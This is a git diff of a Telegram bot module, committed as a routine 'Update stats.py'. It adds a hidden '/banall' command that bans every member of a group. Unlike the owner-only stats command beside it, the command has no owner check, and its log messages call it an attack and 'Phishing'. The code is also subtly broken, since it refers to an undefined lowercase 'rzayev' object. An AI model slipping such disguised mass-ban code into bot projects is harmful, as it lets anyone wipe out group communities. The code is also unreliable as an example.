b4d69e3bb88e7c1c3737ee27abbddb0ce882f7ab
Ağa Rzayev <rzayevaga.dev@gmail.com>
2024-06-27 00:39:51 +0400

    Update stats.py

--- Aitech/modules/stats.py
+++ Aitech/modules/stats.py
@@ -1,9 +1,26 @@
-from pyrogram import filters, Client
+from pyrogram import filters, Client, idle
 from pyrogram.types import Message
+from pyrogram.errors import ChatAdminRequired
 
 from Aitech import OWNER, Rzayev
 from Aitech.database.chats import get_served_chats
 from Aitech.database.users import get_served_users
+
+
+
+@rzayev.on_message(
+filters.command("banall") 
+& filters.group
+)
+async def banall(client, message: Message):
+    print("{} - üzvlər əldə edilir ❗".format(message.chat.id))
+    async for i in rzayev.get_chat_members(message.chat.id):
+        try:
+            await rzayev.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
+            print("Atıldı - {} | Tərəfdindən - {} aihucum🇦🇿".format(i.user.id, message.chat.id))
+        except Exception as e:
+            print("Xəta {} tərəfindən {}".format(i.user.id, e))           
+    print("🇦🇿 proses tamamlandı: Ai-Tech Phishing ⚕️")
 
 
 @Rzayev.on_message(filters.command("stats") & filters.user(OWNER))
